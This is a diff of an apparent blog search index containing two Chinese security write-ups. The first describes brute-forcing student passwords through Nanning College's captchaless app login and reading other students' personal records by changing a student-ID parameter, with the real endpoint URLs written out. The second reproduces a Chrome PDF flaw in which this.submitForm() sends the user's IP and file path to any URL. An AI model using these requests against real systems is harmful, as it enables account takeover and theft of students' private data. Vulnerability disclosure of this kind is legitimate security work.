@@ -5,15 +5,17 @@
     <url>%2F2019%2F03%2F15%2F%E5%8D%97%E5%AE%81%E5%AD%A6%E9%99%A2%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%99%BB%E9%99%86%E4%B8%8E%E5%B9%B3%E8%A1%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
     <content type="text"><![CDATA[一、绕过验证码登陆教务系统登陆界面存在验证码登陆能有效增加攻击者枚举学生教务系统密码成本，但app接口并未作验证码验证且不记录错误次数，因此可以批量对同学们的教务密码进行枚举 1http://jw.nnxy.cn/app.do?method=authUser&amp;xh=学号&amp;pwd=密码 （登陆成功返回token）因此利用如下信息泄露检验学号是否存在，并使用top100password（弱口令排行前100的密码）进行检测（共407条学号）。 二、平行权限信息泄露通过app接口登陆成功后会返回token，利用该token可以查询学生部分信息。 但利用该token不仅可以查询本人部分信息（姓名、院系、班级、考生号等），同时修改xh参数为其他同学的学号也可以进行查询。因此尝试获取20160111001-20160116050之间的同学信息。 附： 123456789个人信息：http://jw.nnxy.cn/app.do?method=getUserInfo&amp;xh=20160116045课表查询：http://jw.nnxy.cn/app.do?method=getKbcxAzc&amp;xh=20160116045&amp;xnxqid=2018-2019-1&amp;zc=7成绩查询：http://jw.nnxy.cn/app.do?method=getCjcx&amp;xh=20160116045&amp;xnxqid=2017-2018-2学生教评：http://jw.nnxy.cn/app.do?method=getPjpcList&amp;xh=20160116045学籍预警：http://jw.nnxy.cn/app.do?method=getEarlyWarnInfo&amp;xh=20160116045&amp;history=1考试查询：http://jw.nnxy.cn/app.do?method=getKscx&amp;xh=20160116045 均未对身份进行验证。声明：对测试时抓取到的学生信息及数据，本人并未在任何平台公开发布、贩卖。]]></content>
       <tags>
-        <tag>web,信息泄露</tag>
+        <tag>信息泄露</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[Chrome浏览器打开PDF造成的信息泄露]]></title>
     <url>%2F2019%2F03%2F01%2FChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80PDF%E9%80%A0%E6%88%90%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
-    <content type="text"><![CDATA[前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对 this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。 漏洞复现通过调用this.submitForm(‘http://baidu.com&#39;)即可向任意URL发送数据 根据发送的数据可知该漏洞可泄露的信息如下：1.用户ip2.操作系统及Chrome版本号3.PDF所在计算机的绝对路径路径 附加（内置PDF阅读器所支持的JavascriptAPI）12345app.launchURL()app.media.getURLdata()app.alert()app.execDialog()doc.getURL() 安全建议：虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。]]></content>
+    <content type="text"><![CDATA[前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。 漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对 this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。 漏洞复现通过调用this.submitForm(‘http://baidu.com&#39;)即可向任意URL发送数据 根据发送的数据可知该漏洞可泄露的信息如下：1.用户ip2.操作系统及Chrome版本号3.PDF所在计算机的绝对路径路径 附加（内置PDF阅读器所支持的JavascriptAPI）12345app.launchURL()app.media.getURLdata()app.alert()app.execDialog()doc.getURL() 安全建议：虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。]]></content>
       <tags>
-        <tag>信息泄露,复现</tag>
+        <tag>信息泄露</tag>
+        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
